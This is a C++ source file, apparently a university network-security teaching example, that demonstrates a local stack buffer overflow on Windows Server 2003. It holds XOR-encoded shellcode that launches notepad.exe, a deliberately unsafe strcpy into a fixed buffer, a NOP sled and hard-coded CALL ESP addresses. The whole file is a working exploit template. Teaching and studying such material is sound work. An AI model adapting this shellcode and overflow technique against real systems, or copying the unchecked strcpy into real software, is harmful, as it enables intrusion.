//  w32Lexploit.cpp: 一个进行本地攻击，执行notepad.exe的例子
//  cl /GS-  w32Lexploit.cpp
//  cl /FD /Zi  /GS-  w32Lexploit.cpp
// 《网络安全》例子程序，作者：曾凡平，中国科学技术大学计算机学院，2014-12-15. Modified on Nov 16, 2022.

#include "windows.h"
#include "stdio.h"
#include "stdlib.h"

char shellcode[]=
/* 287=0x11f bytes */
"\xeb\x10\x5b\x53\x4b\x33\xc9\x66\xb9\x08\x01\x80\x34\x0b\xfe\xe2"
"\xfa\xc3\xe8\xeb\xff\xff\xff\x96\x9b\x86\x9b\xfe\x96\x8e\x9f\x9a"
"\xd0\x96\x90\x91\x8a\x9b\x75\x02\x96\xa9\x98\xf3\x01\x96\x9d\x77"
"\x2f\xb1\x96\x37\x42\x58\x95\xa4\x16\xa8\xfe\xfe\xfe\x75\x0e\xa4"
"\x16\xb0\xfe\xfe\xfe\x75\x26\x16\xfb\xfe\xfe\xfe\x17\x30\xfe\xfe"
"\xfe\xaf\xac\xa8\xa9\xab\x75\x12\x75\x29\x7d\x12\xaa\x75\x02\x94"
"\xea\xa7\xcd\x3e\x77\xfa\x71\x1c\x05\x38\xb9\xee\xba\x73\xb9\xee"
"\xa9\xae\x94\xfe\x94\xfe\x94\xfe\x94\xfe\x94\xfe\x94\xfe\xac\x94"
"\xfe\x01\x28\x7d\x06\xfe\x8a\xfd\xae\x01\x2d\x75\x1b\xa3\xa1\xa0"
"\xa4\xa7\x3d\xa8\xad\xaf\xac\x16\xef\xfe\xfe\xfe\x7d\x06\xfe\x80"
"\xf9\x75\x26\x16\xe9\xfe\xfe\xfe\xa4\xa7\xa5\xa0\x3d\x9a\x5f\xce"
"\xfe\xfe\xfe\x75\xbe\xf2\x75\xbe\xe2\x75\xfe\x75\xbe\xf6\x3d\x75"
"\xbd\xc2\x75\xba\xe6\x86\xfd\x3d\x75\x0e\x75\xb0\xe6\x75\xb8\xde"
"\xfd\x3d\x75\xba\x76\x02\xfd\x3d\xa9\x75\x06\x16\xe9\xfe\xfe\xfe"
"\xa1\xc5\x3c\x8a\xf8\x1c\x18\xcd\x3e\x15\xf5\x75\xb8\xe2\xfd\x3d"
"\x75\xba\x76\x02\xfd\x3d\x3d\xad\xaf\xac\xa9\xcd\x2c\xf1\x40\xf9"
"\x7d\x06\xfe\x8a\xed\x75\x24\x75\x34\x3f\x1d\xe7\x3f\x17\xf9\xf5"
"\x27\x75\x2d\xfd\x2e\xb9\x15\x1b\x75\x3c\xa1\xa4\xa7\xa5\x3d";

void doShellcode(char * shellcode)
{
    puts("Verify the shellcode by call ((void (*)())shellcode)()");
    ((void (*)())shellcode)();
}


#define BUFFER_LEN 128
void overflow(char* attackStr)
{
  char buffer[BUFFER_LEN];
  printf("Smash a %d bytes buffer with %d bytes string.\n", BUFFER_LEN, strlen(attackStr));
  strcpy(buffer,attackStr);
}

// jmp esp address of chinese version
//#define JUMPESP "\x12\x45\xfa\x7f"
#define JUMPESP 0x7c99a01b  // windows2003 sp2 ; sp1=0x7c84fa6a
#define CALLESP 0x7c81f2df  // windows2003 sp2 7c81f2df,7c8366e2,7c874303 ; sp1=0x7c806b69  0x7c82334b
#define ATTACK_BUFF_LEN 1024
#define OFF_SET 132   // 516=0x204

void smashStack(char * shellcode)
{
  char Buff[ATTACK_BUFF_LEN];
  unsigned long *ps;

  memset(Buff, 0x90, ATTACK_BUFF_LEN);

  ps = (unsigned long *)(Buff+OFF_SET);
  *(ps) = CALLESP;
  strcpy(Buff+OFF_SET+4+4, shellcode);
  Buff[ATTACK_BUFF_LEN - 1] = 0;

  overflow(Buff);
}

void main(int argc, char* argv[])
{
  //    doShellcode(shellcode); return; //  验证shellcode的正确性
  smashStack(shellcode);  return;   //  用shellcode进行缓冲区溢出攻击
}   
